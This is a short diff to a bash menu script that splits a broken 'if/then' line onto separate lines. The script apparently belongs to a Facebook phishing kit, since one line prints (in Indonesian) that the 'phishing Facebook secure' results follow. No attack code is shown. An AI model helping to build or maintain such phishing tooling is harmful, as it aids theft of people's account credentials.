@@ -16,7 +16,9 @@ echo $pur"____________________________________"
 echo $pur"╭─["$pur"root@r12n"$pur"]"
 read -p"╰─>> " pil 
 
-if [ $pil = 1 ]thenecho
+if [ $pil = 1 ]
+then
+echo
 $cy"____________________________________"
 echo $cy" BERIKUT ADALAH HASIL PHISING FACEBOOK SECURE"
 cd V1
